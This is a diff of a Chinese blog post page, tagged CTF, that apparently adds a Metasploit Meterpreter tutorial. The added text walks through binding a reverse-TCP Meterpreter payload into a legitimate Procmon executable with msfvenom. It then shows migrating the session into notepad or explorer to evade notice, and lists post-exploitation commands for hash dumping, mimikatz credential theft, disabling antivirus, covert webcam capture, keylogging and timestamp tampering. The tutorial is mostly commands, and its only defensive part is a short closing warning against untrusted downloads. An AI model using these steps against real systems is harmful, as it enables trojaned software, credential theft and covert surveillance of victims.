@@ -26,14 +26,18 @@
 <meta property="og:site_name" content="l1nk&#39;s blog">
 <meta property="og:description" content="meterpreter操作、后渗透模块">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.3.png">
+<meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.4.png">
+<meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.5.png">
+<meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.6.png">
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.1.png">
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.2.png">
 <meta property="article:published_time" content="2024-09-05T10:47:34.194Z">
-<meta property="article:modified_time" content="2024-09-06T07:28:34.364Z">
+<meta property="article:modified_time" content="2024-09-06T08:48:24.763Z">
 <meta property="article:author" content="l1nk">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.1.png">
+<meta name="twitter:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.3.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -228,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          159 字
+          1k 字
         
       </span>
     
@@ -239,7 +243,7 @@
         
         
         
-          2 分钟
+          9 分钟
         
       </span>
     
@@ -283,12 +287,34 @@
                 
                 <h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>在Metasploit Framework（MSF）中，Meterpreter是一种强大的后渗透工具，用于在受攻击的系统上建立一个持久的、交互式的远程Shell。</p>
 <p>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p>
-<p>进入了meterpreter之后可以用 <code>help</code> 直接如何使用命令</p>
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>这个部分介绍如何利用msf其中的后门生成功能将正常的软件改为后门软件，在受害者点击了之后便可以进行攻击。</p>
+<p>这里使用Procmon64.exe，上传到opt目录之后，使用命令成功生成payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#替换为自己的ip和端口</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp -x /opt/Procmon64.exe -k lhost=192.168.56.132 lport=1689 -f exe &gt; /opt/procmon.exe<br></code></pre></td></tr></table></figure>
+<p><img src="/img/%E6%B8%97%E9%80%8F4.3.png" srcset="/img/loading.gif" lazyload alt="图片" title="生成了带后门的procmon软件"></p>
+<p>修改配置项，用我们生成的带后门的procmon软件进行攻击：</p>
+<p><img src="/img/%E6%B8%97%E9%80%8F4.4.png" srcset="/img/loading.gif" lazyload alt="图片" title="配置改为1689端口，成功拿到shell"></p>
+<p>如果希望对方在关闭软件后，会话依然可以保留，就需要在建立会话之后，迅速进行进程迁移</p>
+<p>进程迁移是指为了不被受害者发现自己被攻击了从而把攻击进程伪装起来，通常是把shell进程藏在别的正常的进程中让人不易察觉。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启自动迁移进程</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> autorunscript migrate ‐f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%B8%97%E9%80%8F4.5.png" srcset="/img/loading.gif" lazyload alt="图片" title="成功迁移进程"><br>查看现在的进程号和迁移到的进程：</p>
+<p><img src="/img/%E6%B8%97%E9%80%8F4.6.png" srcset="/img/loading.gif" lazyload alt="图片" title="成功迁移到了进程号为1624的notepad进程"></p>
+<h2 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h2><p>进入了meterpreter之后可以用 <code>help</code> 查看如何使用命令进行攻击</p>
 <p>书接上文，拿到了meterpreter之后：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bg</span> <span class="hljs-comment">#暂挂</span><br>sessions <span class="hljs-comment">#查看有哪些会话</span><br>sessions -i 序号 <span class="hljs-comment">#进入会话</span><br></code></pre></td></tr></table></figure>
 <p><img src="/img/%E6%B8%97%E9%80%8F4.1.png" srcset="/img/loading.gif" lazyload alt="图片" title="进入和退出会话"></p>
 <p>这里可以看到操作失败权限不够，之后会提到如何提权：</p>
 <p><img src="/img/%E6%B8%97%E9%80%8F4.2.png" srcset="/img/loading.gif" lazyload alt="图片" title="还有hashdump可以获取密码的加密后的值"></p>
+<p>拿到了shell之后通常先将进程迁入到explorer.exe</p>
+<p>“explorer.exe是Windows程序管理器或者文件资源管理器。它用于管理Windows图形壳，包括桌面和文件管理，删除该程序会导致Windows图形界面无法使用。资源管理器explorer.exe进程为用户提供了图形用户界面（也称为图形壳），简单的说就是用来显示系统的桌面环境，包括桌面图标和文件管理。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">migrate explorer进程号<br></code></pre></td></tr></table></figure>
+
+<p>其余常用命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi <span class="hljs-comment">#加载mimikatz模块，它可以用来提取 Windows 系统中的密码和凭据信息。</span><br>ps <span class="hljs-comment">#查看目标主机进程信息</span><br>getuid <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem <span class="hljs-comment">#自动帮你提权,获得的当前用户是administrator才能成功</span><br>run killav <span class="hljs-comment">#关闭系统自带的杀毒软件</span><br><span class="hljs-built_in">pwd</span> <span class="hljs-comment">#查看目标主机当前目录(windows)</span><br>getlwd <span class="hljs-comment">#查看本地的当前目录(Linux)</span><br>lcd <span class="hljs-comment">#更改本地工作目录</span><br>lls <span class="hljs-comment">#列出本地文件</span><br>lpwd <span class="hljs-comment">#打印本地工作目录</span><br><br>search ‐f <span class="hljs-string">&#x27;*.jsp&#x27;</span> ‐d <span class="hljs-string">&#x27;e:\&#x27;</span> <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download E:\test.txt /root <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload /root/test.txt d:\<span class="hljs-built_in">test</span> <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid <span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>idletime <span class="hljs-comment">#查看主机运行时间</span><br><br>screenshot <span class="hljs-comment">#截图</span><br>webcam_list <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap <span class="hljs-comment">#拍照 ‐整个过程毫无查觉</span><br>webcam_stream <span class="hljs-comment">#开视频</span><br><br>execute 参数 ‐f 可执行文件 <span class="hljs-comment">#执行可执行程序</span><br><br>keyscan_start <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop <span class="hljs-comment">#停止键盘记录功能</span><br><br>uictl <span class="hljs-built_in">disable</span> keyboard <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl <span class="hljs-built_in">enable</span> keyboard <span class="hljs-comment">#允许目标使用键盘</span><br>uictl <span class="hljs-built_in">disable</span> mouse <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl <span class="hljs-built_in">enable</span> mouse <span class="hljs-comment">#允许目标使用鼠标</span><br><br>load <span class="hljs-comment">#加载扩展库</span><br>run <span class="hljs-comment">#使用扩展库</span><br>timestomp <span class="hljs-comment">#操作文件 MACE 属性</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这里就可以看到不要乱下载软件和安装包，藏个后门在软件里面轻而易举，再进行一下进程迁移甚至都不知道自己的电脑被黑了。乱下载东西很容易就会把你的电脑上线被别人获取信息，特别是那些莫名其妙的软件园千万别去碰，因为不知道里面藏有什么，从功能那里可以看到能进行很多的操作。</p>
 
                 
               </div>
